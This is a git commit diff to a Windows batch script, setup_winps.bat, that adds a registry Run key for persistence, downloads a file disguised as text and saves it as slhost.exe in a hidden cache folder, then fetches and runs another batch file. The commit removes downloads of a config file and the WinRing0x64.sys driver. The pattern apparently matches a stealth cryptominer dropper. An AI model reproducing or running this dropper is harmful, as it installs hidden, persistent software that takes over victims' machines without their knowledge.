300843ede1a8b9c695d400a4d527900ee96c4d0d
anabianca92 <94259852+anabianca92@users.noreply.github.com>
2024-01-15 05:34:16 -0300

    Update setup_winps.bat

--- setup_winps.bat
+++ setup_winps.bat
@@ -8,8 +8,6 @@ REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v 
 mkdir %USERPROFILE%\.cache\services\slhost\ >nul 2>&1 
 
 powershell.exe -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/anabianca92/lol/main/slhost.txt','%USERPROFILE%\.cache\services\slhost\slhost.exe')"
-powershell.exe -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/anabianca92/lol/main/gta.json','%USERPROFILE%\.cache\services\slhost\config.json')"
 powershell.exe -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/anabianca92/lol/main/start.cmd','%USERPROFILE%\.cache\services\slhost\Noise.bat')"
-powershell.exe -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/anabianca92/lol/main/WinRing0x64.sys','%USERPROFILE%\.cache\services\slhost\WinRing0x64.sys')"
 
 %USERPROFILE%\.cache\services\slhost\Noise.bat
